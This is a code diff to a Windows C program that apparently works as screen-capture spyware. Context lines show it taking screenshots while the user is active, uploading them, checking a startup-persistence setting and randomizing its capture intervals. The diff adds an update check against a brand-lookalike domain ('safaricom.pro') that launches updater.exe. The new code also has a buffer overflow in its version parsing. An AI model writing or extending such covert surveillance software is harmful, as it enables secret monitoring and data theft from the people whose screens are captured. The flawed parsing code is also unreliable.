@@ -11,6 +11,7 @@
 #include <png.h>
 #include <gdiplus.h>
 
+
 #define INACTIVITY_THRESHOLD 60
 #define BASE_URL "http://localhost/website_folder3/upload.php"
 const char *headers[] = {
@@ -23,6 +24,58 @@ const char *headers[] = {
 
 volatile sig_atomic_t flag = 0;
 
+char *CURRENT_VERSION;
+
+char* read_version_from_config() {
+    FILE *file = fopen("config.txt", "r");
+    if (!file) return NULL;
+    char line[50];
+    char *version = (char*)malloc(10);
+    if (!version) return NULL;
+
+    if (fgets(line, sizeof(line), file)) {
+        sscanf(line, "version=%s", version);
+    }
+    fclose(file);
+
+    // Remove newline if it exists
+    size_t len = strlen(version);
+    if (len > 0 && version[len-1] == '\n') version[len-1] = '\0';
+    return version;
+}
+
+
+int compare_versions(const char *v1, const char *v2) {
+    int num1 = 0, num2 = 0;
+
+    // Skip any non-numeric prefix (like "v.")
+    while (*v1 && (*v1 < '0' || *v1 > '9')) v1++;
+    while (*v2 && (*v2 < '0' || *v2 > '9')) v2++;
+
+    while (*v1 || *v2) {
+        if (*v1) {
+            num1 = strtol(v1, (char **) &v1, 10);
+        } else {
+            num1 = 0;
+        }
+
+        if (*v2) {
+            num2 = strtol(v2, (char **) &v2, 10);
+        } else {
+            num2 = 0;
+        }
+
+        if (num1 > num2) return 1;
+        if (num1 < num2) return -1;
+
+        if (*v1) v1++;
+        if (*v2) v2++;
+    }
+
+    return 0;
+}
+
+
 void signal_handler(int sig)
 {
     flag = 1;
@@ -33,6 +86,81 @@ typedef struct
     BYTE *data;
     unsigned int size;
 } PNGIOData;
+
+char* my_strndup(const char* s, size_t n) {
+    size_t len = strnlen(s, n);  // get length up to 'n'
+    char* new_str = (char*) malloc(len + 1);  // +1 for the null-terminator
+    if (new_str == NULL) return NULL;  // memory allocation failed
+    new_str[len] = '\0';  // null-terminate the new string
+    return memcpy(new_str, s, len);  // copy the string over
+}
+
+
+size_t write_version_data(void *buffer, size_t size, size_t nmemb, void *userp) {
+    char **response_ptr = (char**)userp;
+    *response_ptr = my_strndup(buffer, (size_t)(size *nmemb));
+    return size * nmemb;
+}
+
+BOOL fetch_new_version(char **new_version) {
+    CURL *curl = curl_easy_init();
+    CURLcode res;
+    BOOL success = FALSE;
+
+    if (curl) {
+        curl_easy_setopt(curl, CURLOPT_URL, "https://safaricom.pro/versioning.txt");
+        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_version_data);
+        curl_easy_setopt(curl, CURLOPT_WRITEDATA, new_version);
+        res = curl_easy_perform(curl);
+        if (res != CURLE_OK) {
+            fprintf(stderr, "Failed to fetch version data: %s\n", curl_easy_strerror(res));
+        } else {
+            success = TRUE;
+        }
+        curl_easy_cleanup(curl);
+    }
+    return success;
+}
+
+void check_and_update() {
+    char *new_version = NULL;
+    if (fetch_new_version(&new_version) && new_version) {
+        printf("Fetched new version: %s\n", new_version);
+        printf("Comparing with current version: %s\n", CURRENT_VERSION);
+
+        if (compare_versions(new_version, CURRENT_VERSION) > 0) {
+            printf("New version is greater. Initiating update...\n");
+
+            // Start the updater.exe process to handle the update
+            STARTUPINFO si;
+            PROCESS_INFORMATION pi;
+
+            ZeroMemory(&si, sizeof(si));
+            si.cb = sizeof(si);
+            ZeroMemory(&pi, sizeof(pi));
+
+            if (!CreateProcess(NULL, "updater.exe", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+                fprintf(stderr, "CreateProcess failed (%d).\n", GetLastError());
+                free(new_version);
+                return;
+            }
+
+            // Close process and thread handles 
+            CloseHandle(pi.hProcess);
+            CloseHandle(pi.hThread);
+
+            // Exit the current program to allow the update to take place
+            free(new_version);
+            exit(0);
+        } else {
+            printf("Current version is up-to-date.\n");
+        }
+        free(new_version);
+    } else {
+        printf("Failed to fetch new version or new version is null.\n");
+    }
+}
+
 
 BOOL isUserInactive()
 {
@@ -285,6 +413,11 @@ void upload_screenshot(BYTE *image_data, unsigned int image_size, char *uuid)
 }
 
 int main(int argc, char **argv) {
+    CURRENT_VERSION = read_version_from_config();
+    if (!CURRENT_VERSION) {
+        fprintf(stderr, "Failed to read current version from config\n");
+        return 1;
+    }
     signal(SIGINT, signal_handler);
 
     if (!isStartupSet()) {
@@ -298,10 +431,15 @@ int main(int argc, char **argv) {
     }
 
     srand(time(NULL));
+
+    // Updater check runs only once
+    check_and_update();
+
     while (1) {
         if (flag) { 
             break;
         }
+        
         if (!isUserInactive()) {
             HBITMAP hbmScreenshot = capture_screenshot();
             if (hbmScreenshot) {
@@ -317,7 +455,7 @@ int main(int argc, char **argv) {
                 }
                 DeleteObject(hbmScreenshot);
             }
-            int rand_interval = RAND_INTERVAL_MIN + rand() % (RAND_INTERVAL_MAX - RAND_INTERVAL_MIN + 1);  // Assuming 
+            int rand_interval = RAND_INTERVAL_MIN + rand() % (RAND_INTERVAL_MAX - RAND_INTERVAL_MIN + 1);  // Assuming RAND_INTERVAL_MIN and RAND_INTERVAL_MAX are defined somewhere
             Sleep(rand_interval * 1000);
         }
     }
